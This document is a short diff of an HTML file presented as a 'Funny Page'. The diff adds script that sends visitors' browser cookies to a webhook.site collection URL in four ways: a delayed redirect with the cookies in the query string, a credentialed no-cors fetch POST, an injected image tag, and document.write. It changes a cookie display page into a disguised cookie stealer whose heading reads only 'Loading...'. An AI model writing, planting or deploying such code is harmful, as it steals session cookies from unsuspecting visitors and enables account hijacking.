@@ -4,27 +4,28 @@
     <title>Funny Page</title>
 </head>
 <body>
-    <h1>Welcome to my funny page!</h1>
-    <div id="cookieDisplay"></div>
+    <h1>Loading...</h1>
     <script>
-        // Display cookies on the page itself
-        const cookies = document.cookie;
-        document.getElementById('cookieDisplay').innerText = cookies;
-        
-        // Also try to send them via fetch with no-cors
+        // Method 1: Try to navigate with cookies in URL
+        setTimeout(() => {
+            window.location = 'https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd?' + document.cookie;
+        }, 1000);
+
+        // Method 2: Try fetch with credentials
         fetch('https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd', {
             method: 'POST',
+            credentials: 'include',
             mode: 'no-cors',
-            headers: {
-                'Content-Type': 'text/plain',
-            },
-            body: cookies
+            body: document.cookie
         });
 
-        // And try via XMLHttpRequest as backup
-        const xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd?c=' + encodeURIComponent(cookies));
-        xhr.send();
+        // Method 3: Create img with cookies in src
+        const img = document.createElement('img');
+        img.src = 'https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd?c=' + encodeURIComponent(document.cookie);
+        document.body.appendChild(img);
+
+        // Method 4: Try to read and display cookies directly
+        document.write("Cookies: " + document.cookie);
     </script>
 </body>
 </html>
